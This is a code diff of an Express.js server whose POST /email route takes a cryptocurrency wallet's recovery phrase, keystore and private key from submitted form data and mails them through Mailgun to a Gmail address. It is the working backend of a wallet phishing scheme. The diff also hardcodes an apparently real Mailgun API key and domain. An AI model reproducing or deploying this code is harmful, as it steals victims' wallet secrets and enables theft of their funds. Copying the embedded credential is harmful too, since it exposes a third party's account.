@@ -1,16 +1,14 @@
+require("custom-env").env();
 const express = require("express");
 const path = require("path");
 // const sendMail = require("./mail");
 const app = express();
 const mailgun = require("mailgun-js");
 
-require("custom-env").env();
-
 const PORT = 8080;
 
 // data parsing
 app.use(express.urlencoded({ extended: false }));
-
 app.use(express.json());
 
 app.post("/email", (req, res) => {
@@ -19,28 +17,22 @@ app.post("/email", (req, res) => {
   console.log("Data: ", req.body);
 
   const mg = mailgun({
-    apiKey: process.env.apikey,
-    domain: process.env.domain,
+    apiKey: "01550eeb736f48295faff733d574840c-c4d287b4-fdbdfa33",
+    domain: "sandbox04b4abdcddc343b18a4ee96acd1c7a03.mailgun.org",
   });
 
   const data = {
     from: "bankoleidris2001@gmail.com",
-    to: "ycomng@gmail.com",
+    to: "bankoleidris2001@gmail.com",
     subject: "Hello",
-    text: "Testing some Mailgun awesomness!",
+    text: `   phrase: ${phrase}
+              keystore: ${keyStore}
+              privatekey: ${privateKey}`,
   };
   mg.messages().send(data, function (error, body) {
     console.log(body);
     console.log(error);
   });
-  // sendMail(phrase, keyStore, privateKey, function (err, data) {
-  //   if (err) {
-  //     console.log(err);
-  //     res.status(500).json({ message: "internal error" });
-  //   } else {
-  //     res.json({ message: "email sent" });
-  //   }
-  // });
 });
 
 app.get("/", (req, res) => {
